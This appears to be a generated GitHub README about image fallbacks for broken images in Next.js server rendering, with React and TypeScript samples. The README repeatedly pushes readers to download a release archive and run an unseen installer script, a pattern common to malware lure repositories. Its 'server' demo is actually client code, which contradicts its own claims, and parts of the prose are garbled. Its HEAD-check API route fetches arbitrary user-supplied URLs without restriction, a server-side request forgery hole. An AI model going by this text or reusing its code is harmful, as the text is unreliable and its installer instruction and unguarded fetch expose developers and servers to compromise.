[![Releases](https://img.shields.io/badge/releases-v1.0.0-blue?style=for-the-badge&logo=github)](https://github.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/releases)

Welcome to a focused project that tackles a stubborn bug in the React and Next.js ecosystem. This repository demonstrates a clean, reliable approach to handle broken image URLs without breaking the user experience during server-side rendering (SSR). The core problem is that <img onError={...}> handlers on broken images can fail to trigger in SSR contexts. That behavior causes visible gaps, broken visuals, and SEO drawbacks. The fix presented here combines client-side handling with server-side checks to deliver a consistent fallback experience, even for the initial paint. The result is a robust image fallback mechanism that remains SEO-friendly and performs well on real-world pages.

In this README you will find a detailed tour of the problem space, the solution philosophy, concrete demos, practical steps to run and test, and guidance for extending the approach to your own Next.js and React projects. The structure mirrors real-world projects you would use in production, with clear separation between client-side behavior, server-side checks, and the user interface that renders fallback content when an image is missing or blocked.

Why this problem matters

Images are essential for conveying information and context on the web. When an image URL is broken or blocked by a server, the page can show a broken image icon or nothing at all. This is especially problematic for pages that rely on critical imagery for context, product visuals, or marketing banners. In SSR workflows, the issue compounds: the server renders the initial HTML, and the client then hydrates. If onError handlers do not fire as expected, the fallback content might not render, leaving a placeholder that feels broken on first paint.

This problem touches multiple concerns:
- Hydration stability: Mismatches between server-rendered markup and client expectations can trigger hydration warnings and, in some cases, content flicker.
- SEO and accessibility: Missing or inlined fallback content can impact crawlability and accessibility. Alt text and meaningful fallback content help retain SEO value even when an image is missing.
- Performance: A well-designed fallback reduces layout shifts and improves perceived performance by presenting a graceful alternative immediately.
- Developer experience: A clear pattern makes it easier to reason about image rendering across server and client boundaries.

How the fix works at a high level

The approach in this repository blends client-side resilience with server-side checks to ensure that broken images do not degrade the user experience or the page’s SEO quality. The core ideas are:

- Client-side resilience with onError: React components render an image tag and attach an onError handler. When the image fails to load, the handler triggers a state update that swaps the broken image with a safe fallback. This is familiar to React developers but can fail during SSR hydration if the image element is not loaded or if the error event does not fire reliably.

- Server-side pre-checks (HEAD checks): Before rendering the final HTML, the server performs HEAD requests to the image URLs to verify their existence and accessibility. If a URL is unreachable, the server can proactively render a safe fallback in the HTML, so the browser never encounters a broken image on initial paint.

- SEO-friendly fallbacks: The fallback strategy is designed to preserve the semantic meaning of the content. This includes alt text, accessible captions, and structured data where appropriate. The goal is to ensure search engines index the content accurately, even when the image cannot be displayed.

- Client-components-first with server checks: The demos emphasize client components to demonstrate interactivity and reliability, while the server-side checks demonstrate a robust baseline rendering that reduces the risk of broken images impacting SEO.

- Performance-conscious design: The design minimizes layout shifts by pre-sizing the image container and by using a consistent placeholder that preserves layout space. By avoiding abrupt content changes, the user’s visual experience remains stable.

Demos overview

This repository ships with two practical demos that illustrate the core concepts in a concrete, developer-friendly way:

- Client Components demo: A fully client-side approach that attaches onError handlers to images, swaps to a fallback image or UI, and demonstrates how to handle multiple failure cases in a robust, predictable manner.

- Server-side HEAD checks for SEO-safe rendering: A server-ready approach that performs HEAD checks to determine if an image is accessible. If not, the server renders a fallback element in place, ensuring the initial render is complete and meaningful for accessibility and SEO.

The demos are designed to be approachable for teams already using React with Next.js, and they align with common patterns in Next.js 13+ using either the App Router or the Pages Router. They also show how to structure code so that server-side checks and client-side fallbacks do not conflict, and how to keep hydration stable across the boundary.

In the following sections, you’ll find practical, copy-paste-ready code samples, a walkthrough of the file structure, and step-by-step instructions to run the demos locally.

Client Component demo: resilient onError handling

The client component demonstration focuses on a robust onError pattern. The key ideas are:

- A small, deterministic image wrapper that handles onError gracefully.
- A local fallback UI that appears instantly when a load error occurs.
- Clear alt text that remains meaningful even when the image itself cannot be shown.
- Minimal re-renders and predictable state transitions to avoid flicker.

Typical workflow:
- The component renders with the primary image URL.
- If the image loads, all is well and the UI remains unchanged.
- If the image fails to load, the onError handler swaps the image source to a fallback URL or renders a structured fallback UI.
- Optional: The component includes a retry button to re-attempt loading the original image, with safeguards to avoid infinite retries.

Code snippet (Client Component)
```tsx
// components/ImageWithFallback.client.tsx
'use client';

import React, { useCallback, useState } from 'react';

type ImageWithFallbackProps = {
  src: string;
  alt: string;
  fallbackSrc?: string;
  width?: number;
  height?: number;
};

export const ImageWithFallback: React.FC<ImageWithFallbackProps> = ({
  src,
  alt,
  fallbackSrc = '/fallback-image.png',
  width = 600,
  height = 400,
}) => {
  const [currentSrc, setCurrentSrc] = useState<string>(src);
  const [hasErrored, setHasErrored] = useState<boolean>(false);

  const onError = useCallback(() => {
    if (!hasErrored) {
      setHasErrored(true);
      // Swap to the fallback image or a generated placeholder
      setCurrentSrc(fallbackSrc);
    }
  }, [hasErrored, fallbackSrc]);

  const onRetry = useCallback(() => {
    setHasErrored(false);
    setCurrentSrc(src);
  }, [src]);

  return (
    <div style={{ width, height, position: 'relative', overflow: 'hidden' }}>
      <img
        src={currentSrc}
        alt={alt}
        width={width}
        height={height}
        onError={onError}
        style={{ objectFit: 'cover', width: '100%', height: '100%' }}
      />
      {hasErrored && (
        <div
          role="button"
          aria-label="Retry loading image"
          onClick={onRetry}
          style={{
            position: 'absolute',
            bottom: 8,
            right: 8,
            background: 'rgba(0,0,0,0.6)',
            color: '#fff',
            padding: '6px 10px',
            borderRadius: 6,
            cursor: 'pointer',
          }}
        >
          Retry
        </div>
      )}
    </div>
  );
};
```

Usage example
```tsx
// app/page.tsx (Client Component demo page)
'use client';
import React from 'react';
import { ImageWithFallback } from '@/components/ImageWithFallback.client';

export default function ClientDemoPage() {
  return (
    <main>
      <h1>Client-side OnError Demo</h1>
      <p>Below is a client-only image that uses a fallback when the URL is broken.</p>
      <ImageWithFallback
        src="https://example.invalid/broken-image.jpg"
        alt="Product photo that might be missing"
        fallbackSrc="https://dummyimage.com/600x400/000/fff&text=Fallback"
      />
    </main>
  );
}
```

The client-only approach is straightforward and great for quick wins. However, it can still suffer on initial render when the server sends HTML that references an image that cannot be loaded on the client due to network constraints, hot reload, or hydration quirks. That is where the server-side HEAD checks shine, providing an extra layer of resilience.

Server-side HEAD checks for SEO-safe rendering

The server-side approach complements the client pattern by validating image URLs during server-side rendering. The idea is to pre-validate images via HEAD requests and render safe fallbacks on the server if the image cannot be loaded. This ensures the HTML sent to the client is already complete and safe to render, reducing the risk of layout shifts and broken visuals on the initial paint.

Key aspects:
- HEAD checks are lightweight and verify that the resource exists and is reachable without downloading the full image content.
- When a HEAD check fails, the server substitutes a fallback element directly in the rendered HTML. This preserves font metrics, layout, and semantics.
- The client component remains useful for dynamic changes that occur after the initial render, providing an additional layer of resilience if a URL becomes broken after hydration.

Server-side example (Next.js API route and page)
```ts
// server/api/headCheck.ts
import type { NextApiRequest, NextApiResponse } from 'next';

export default async function handler(req: NextApiRequest, res: NextApiResponse) {
  const { url } = req.query;
  if (!url || Array.isArray(url)) {
    res.status(400).json({ ok: false, message: 'url query param required' });
    return;
  }

  try {
    const headRes = await fetch(url, { method: 'HEAD' });
    const ok = headRes.ok;
    const contentType = headRes.headers.get('content-type') || '';
    res.status(200).json({ ok, contentType });
  } catch (err) {
    res.status(500).json({ ok: false, message: 'HEAD check failed', error: String(err) });
  }
}
```

```tsx
// app/server-demo/page.tsx
'use client';
import React, { useEffect, useState } from 'react';

type HeadCheckResult = {
  ok: boolean;
  contentType?: string;
};

async function headCheck(url: string): Promise<HeadCheckResult> {
  const resp = await fetch(`/api/headCheck?url=${encodeURIComponent(url)}`);
  if (!resp.ok) return { ok: false };
  return resp.json();
}

export default function ServerDemoPage({ imageUrl }: { imageUrl: string }) {
  const [status, setStatus] = useState<HeadCheckResult | null>(null);

  useEffect(() => {
    headCheck(imageUrl).then(setStatus);
  }, [imageUrl]);

  if (status?.ok === false) {
    return (
      <div style={{ width: '100%', maxWidth: 800 }}>
        <img
          src="https://dummyimage.com/800x450/000/fff&text=Fallback"
          alt="Fallback banner due to unreachable image"
          style={{ width: '100%', height: 'auto' }}
        />
        <p aria-label="image-status" style={{ fontSize: 14, color: '#555' }}>
          The requested image could not be loaded. A safe fallback is shown for SEO and accessibility.
        </p>
      </div>
    );
  }

  // When status is unknown or ok, render the original image in a safe container
  return (
    <div style={{ width: '100%', maxWidth: 800 }}>
      <img
        src={imageUrl}
        alt="Primary image with server-verified availability"
        style={{ width: '100%', height: 'auto' }}
      />
    </div>
  );
}
```

The server-side approach is particularly helpful when you want to ensure the initial HTML a search engine crawler sees is free from broken images. It does not replace the client-side fallback; instead, it complements it by reducing the chance of broken visuals on the first paint.

Implementation details and file layout

This repository follows a clean structure to separate concerns and to make it easy to reason about how each part contributes to the overall solution.

Notes about file design
- The client component is a self-contained unit that can be dropped into any Next.js page. It handles its own state and provides a clean API for root-level props like src, alt, and fallbackSrc.
- The server utilities separate concerns of network I/O and UI rendering. This separation makes testing more straightforward and allows you to swap different strategies for fallback rendering without changing the UI components.
- The public folder hosts a basic fallback image that guarantees a predictable layout even when the image fetch fails. Keeping a stable placeholder helps reduce layout shifts and improves user experience.

Key concepts and patterns

Human-friendly fallbacks
- Always pair an image with meaningful alt text. If an image cannot render, the alt text should convey the essential meaning of the image. This helps screen readers and search engines understand the content.

Stable layout
- Pre-size the image container to prevent layout shifts. Use a fixed aspect ratio or a predictable height and width during initial render. This makes the page feel fast and reliable.

Progressive enhancement
- Start with server-side checks to render a safe fallback. On the client, enhance the experience with onError handlers, retry logic, and interactive fallbacks. The combination yields a robust UX across devices and networks.

Hydration safety
- Ensure client-side state updates do not cause mismatches with server-rendered markup. The client-only component approach isolates client behavior to avoid hydration mismatches.

Accessibility considerations
- Provide accessible fallback content. When rendering a fallback, include a visible caption or helper text describing what happened. Use ARIA roles where appropriate to announce dynamic changes to assistive technologies.

Performance considerations
- HEAD checks should be rate-limited and cached to avoid overloading the server with requests. Use a reasonable timeout for network checks and respect cross-origin policies. Consider a TTL for cached HEAD-check results to balance freshness and performance.

SEO implications

Why SEO-friendly fallbacks matter
- Search engines simulate user experiences by parsing and indexing the HTML that arrives on the first render. If an image tag is broken, the search engine might still index the surrounding content, but it benefits from a deterministic, accessible fallback. A well-designed fallback helps preserve semantic meaning, ensures images are not treated as dead content, and can improve crawl efficiency.

Best practices for SEO-ready fallbacks
- Always provide alt text that communicates the content and purpose of the image when the image cannot be shown.
- Use a semantic wrapper around images to convey context, such as a caption or short descriptive text near the image.
- If content is image-dependent, consider a text alternative or a data-augmented representation that remains accessible when the image fails to load.
- Use server-side checks to reduce the number of times crawlers encounter broken images on first paint, improving crawl efficiency and user perception.

Deployment notes

Releases and assets
This project uses a release-driven approach for distributing a runnable demo. The Releases page contains pre-packaged assets that illustrate the pattern described in this repository. The assets may include:
- A ready-to-run Next.js project with sample pages for both client and server demos.
- A setup script to bootstrap dependencies and start the local dev server.
- A set of example images and placeholders to demonstrate both success and failure scenarios.

From the Releases page, download the latest demo asset and run the included installer. Specifically:
- Look for a file named react-nextjs-ssr-onerror-img-issue-fix-demo-vX.Y.Z.tar.gz (or a similarly named archive) and download it.
- Extract the archive to a local workspace.
- Run the included installer script, for example: bash install-demo.sh or ./install-demo.sh, depending on your environment.
- Follow the on-screen prompts to start the local server and view the demos in your browser.

Note: The link to the releases page is included again here for clarity: https://github.com/Thatguysnothim/react-nextjs-ssr-onerror-img-issue-fix/releases. Download the latest asset from that page and execute the installer to boot the demos locally. Refer to the releases page for the exact asset file name and instructions specific to that release.

- v2.0.0: Major refactor to support headless environments and production-grade deployment patterns. Introduces feature flags and a pluggable strategy for fallbacks.

Implementation notes

Code organization
- The client component is designed to be drop-in: a simple, reusable wrapper around an img element. It gracefully handles onError and provides a straightforward API to customize the fallback behavior.
- The server utilities handle the HEAD checks, including a lightweight client for server-to-server validation and a small helper to render server-side fallbacks when needed.
- The public assets include a predictable fallback image to ensure the layout remains stable.

Error handling philosophy
- Do not throw errors that crash rendering. Instead, fall back to safe visuals.
- Log meaningful diagnostics to help you understand why a fallback happened, without leaking sensitive details or overwhelming the console.

Testing strategies

Manual testing
- Break the image URL intentionally and observe that:
  - Client demo falls back to the placeholder UI with accessible alt text.
  - Server demo renders a server-provided fallback without waiting for client hydration.
  - The user sees a stable layout, and a fallback indicator is available for accessibility.

- Verify that the retry option triggers a re-load attempt for the original image URL, with a reasonable guard to prevent infinite retries.

Automated tests (suggested)
- Unit tests for the client component to verify:
  - onError triggers only when the image fails to load.
  - Fallback swap does not occur when the image loads successfully.
  - The retry flow resets the state correctly.

- Integration tests for the server API endpoint:
  - When the URL is valid and head checks succeed, the server indicates availability.
  - When the URL is invalid or unreachable, the server returns a fallback indicator and optional content signaling.

- Accessibility tests:
  - Ensure alt text remains meaningful when the image cannot render.
  - Confirm that the fallback UI maintains legibility and keyboard accessibility.

How to contribute

This project welcomes contributions from developers who want to improve SSR image reliability and SEO-safe fallbacks. Here are guidelines to help you get started:

- Start by forking the repository and creating a feature branch with a descriptive name, such as fix/ssr-onerror-fallback.
- Keep changes focused on the image fallback logic, server checks, and demo pages. Avoid large refactors that might destabilize the demos.
- Write tests where applicable. If a new edge case appears, add unit or integration tests to cover it.
- Update the README with any new patterns or configurations you introduce.
- If you want to propose a different fallback strategy, describe it clearly in an issue before starting work.

Code quality and conventions
- Follow TypeScript best practices. Prefer explicit types and clear interfaces.
- Keep components small and focused. A single component should handle one responsibility.
- Document any non-obvious decisions in code comments so future readers understand the rationale.
- Strive for readability. Use simple variable names and straightforward control flow.
- Prefer explicit checks over implicit truthiness in critical paths.

Usage and examples

The repository includes two primary usage patterns: a client-focused approach and a server-assisted approach. You can mix and match these patterns depending on your project needs and your SSR framework version.

Client-focused usage
- Import the ImageWithFallback.client.tsx component into any page that uses images with potential external URLs.
- Provide a fallback source for the situations where the primary image fails to load.
- Optionally expose a retry mechanism to let users attempt reloading the primary image.

Server-assisted usage
- Use the server-side HEAD check function to determine whether an image is accessible before rendering the HTML.
- If the HEAD check fails, render a structured fallback container on the server so the first paint shows meaningful content.

Accessibility checklist

- Alt text: Ensure every image includes an alt attribute that conveys the image’s meaning or purpose.
- Captions and context: Provide captions or surrounding text that describes the image’s role in the content.
- Keyboard accessibility: If you offer interactive fallback UI, ensure it is reachable via keyboard and operable with a screen reader.
- Color contrast: Ensure that the fallback content maintains sufficient contrast and remains legible on all backgrounds.

Performance considerations in the real world

- HEAD checks add a small amount of latency to server-side rendering. Mitigate by caching HEAD results per URL with a reasonable TTL.
- The fallback content should be lightweight and designed to preserve the layout. Avoid large or complex placeholders that negate the performance benefits.
- Use a minimal, deterministic placeholder to reduce layout shifts. If possible, predefine aspect ratios for image containers.

Security and privacy considerations

- When performing HEAD checks, avoid leaking internal URLs or sensitive data. Sanitize any incoming URLs and restrict the scope of HEAD checks.
- Do not expose internal error details to the client. Use generic messages or statuses that are safe to relay publicly.
- Respect cross-origin policies and CORS restrictions when performing server-side HEAD requests. Ensure the server has permission to fetch external images if cross-origin resources are involved.

A close look at the demo pages

Client Demo Page
- This page demonstrates a simple image with an onError handler that swaps to a fallback image when loading fails.
- The layout uses a predictable container size to minimize layout shifts.
- The fallback includes a small action to retry loading the original image URL.

Server Demo Page
- This page demonstrates the server-side approach. It attempts a HEAD check on the image URL and renders a server-side fallback if the image is not accessible.
- It shows how the server’s decision affects the initial HTML, improving SEO and accessibility on the first paint.

Hybrid demo page (recommended pattern)
- A hybrid approach combines the server-side HEAD check with a client-side onError fallback. If the image creases an issue after hydration, the client-side fallback handles it gracefully.

Why this approach scales

- Clear separation of concerns: The server logic and client logic are decoupled, which makes maintenance easier and reduces the risk of one path interfering with the other.
- Extensible design: You can extend the server-side checks to include more sophisticated heuristics, such as checking for hotlink protection or rate-limited responses, without changing the UI code.
- Reusable components: The client component can be reused across multiple pages or projects without dragging along heavy dependencies or nonessential logic.

Important notes and caveats

- Some environments may still exhibit edge cases where onError does not fire reliably. In those cases, the server-side HEAD check provides a safety net to deliver a fallback UI on the initial paint.
- If the image URL is controlled by user input or third-party services, consider sanitization and validation steps to avoid SSR rendering pitfalls or security concerns.
- The approach described here is deliberately pragmatic. It aims to be practical for production usage, not theoretical perfection.

Flags, metrics, and instrumentation

- You can instrument the client component to emit event metrics when fallbacks are triggered, the time to first meaningful paint, and the time to full image rendering. This data helps assess the user experience improvements introduced by the fix.
- On the server side, you can measure HEAD check latency and cache hit rates. Use these metrics to tweak caching strategies and to identify URLs that consistently fail HEAD checks.

Reproducing in a fresh project

If you want to reproduce the patterns in a new project, you can follow these steps:

- Create a Next.js project (with App Router) and install React if necessary.
- Create a simple image component that uses the client-side onError fallback approach.
- Implement a small server route to perform HEAD checks and render a server-side fallback when needed.
- Build a page that uses the image component in a real-world context—an article with a hero image, a product gallery, or a feature tile.

What to learn from this project

- SSR image handling is a nuanced problem that benefits from both client-side resilience and server-side checks.
- A well-built fallback strategy preserves layout, accessibility, and SEO while keeping the user experience smooth.
- A modular design helps teams scale the approach across many images and pages without duplicating logic.

FAQ

- Does this work with Next.js 13+ App Router?
  Yes. The demos are designed around App Router concepts, including server components and client components where beneficial.

- How do I test the server-side head check locally?
  Run the server, navigate to a page with a known broken image URL, and inspect the rendered HTML. You should see a fallback element rendered by the server when the HEAD check fails.

- Can I extend this to other media types, like videos?
  The same principles apply. A server-side check combined with a client-side fallback can be adapted to other media resources with appropriate handling.

- Is there any risk of exposing internal URLs in the logs?
  When implementing HEAD checks, sanitize logs to avoid leaking sensitive or internal URLs. Log only high-level statuses and success or failure indicators.

- How do I customize the fallback UI?
  You can replace the fallback component with your own design. Ensure the accessible alt text remains meaningful and that the layout remains stable.

- What about dynamic images loaded via lazy loading?
  Combine the server-side check with the client-side onError logic. Lazy loading can still benefit from a safe fallback, especially for below-the-fold images.

- How do I verify the fix on a real page?
  Use a page with multiple image URLs, including some broken or restricted URLs. Confirm that:
  - The client-side onError triggers appropriately.
  - The server-side fallback ensures initial paint stability.
  - The page remains SEO-friendly with reliable alt text and captions.

- What if the image is cross-origin blocked?
  Rely on the server-side HEAD checks to detect inaccessibility. If the image is intentionally blocked by CORS or a server policy, the HEAD request will typically reflect that status, allowing you to render a safe fallback.

- Are there any licensing considerations for the assets?
  The sample assets in the repository follow standard open practices for demos. If you pull assets from the Releases page, review the license terms associated with each asset and abide by them.

- How can I contribute new ideas or improvements?
  Open an issue to discuss your idea, then fork the repository and submit a pull request with a focused patch or feature branch. Include tests if possible and update the documentation accordingly.

Release notes and future directions

- The current release emphasizes robust, SEO-friendly image fallbacks with a hybrid pattern that combines server checks and client onError handling. The approach is intentionally pragmatic and oriented toward real-world usage.
- Future directions may include:
  - A broader set of fallback strategies (e.g., lazy-loaded placeholders, progressive image loading with low-quality placeholders, and adaptive placeholders based on device capabilities).
  - A more sophisticated caching strategy for HEAD checks, including stale-while-revalidate (SWR) patterns to optimize performance further.
  - Integration with CDN-aware logic to minimize round-trips and to handle image delivery nuances across different regions.

Environment and prerequisites

- Node.js 18.x or newer
- npm 8.x or yarn 1.x (or any compatible package manager)
- A modern browser for client-side testing
- A terminal with bash or a compatible shell for running the installer script

Usage notes for teams

- For teams that rely on SSR with heavy imagery, this approach reduces the risk of rendering glitches and improves perceived performance.
- It is suitable for marketing sites, product pages, and content-centric pages where a high-quality image experience matters.
- The approach scales with your project. You can apply the same pattern to multiple images across pages with minimal boilerplate.

Images and visuals

- The repository includes a simple banner image to illustrate the demos and a fallback image. To keep things light and fast in the README, a lightweight placeholder banner is used here.
- For live demos, you can customize banners to reflect your brand or testing scenarios. The images you use should reflect the branding of your site and maintain consistent aspect ratios to preserve layout stability.

If you are following the instruction to download and execute a file from the Releases page, look for a release asset named something like react-nextjs-ssr-onerror-img-issue-fix-demo-v1.0.0.tar.gz. Download that archive, extract it, and run the included installer script, such as install-demo.sh. This installer sets up a local development environment that mirrors the demos described in this README, wiring together the client and server sides of the fallback strategy and providing a convenient starting point for experimentation.

Appendix: extended examples and references

- Example of a more advanced client-side image wrapper that supports multiple fallbacks (primary, secondary, and a data-driven list of fallbacks) with a simple event logging hook for analytics.
- Example server API for batch HEAD checks to optimize performance when a page contains several images. This reduces the number of round-trips by performing caching and batched requests where possible.
- A11y-friendlier fallback UI patterns, including a dismissible caption and an accessible progress indicator during fallback rendering.

Demo gallery concepts (for inspiration)

- A hero banner that uses a server-verified image to prevent a broken hero section on initial paint.
- A product grid where each product image uses a client-side fallback pattern to ensure consistent visuals even when some product images fail to load.
- A news article layout with an image that uses a server-checked HEAD approach to keep the article layout stable across devices and network conditions.

Final reminder

This README presents a practical approach to a stubborn SSR issue. It is designed to be actionable, readable, and scalable. The two-pronged strategy—server-side validation plus client-side resilience—offers a dependable pattern for anyNext.js project facing the onError image challenge. The details above are crafted to help you implement, test, and extend this approach in a real development environment.
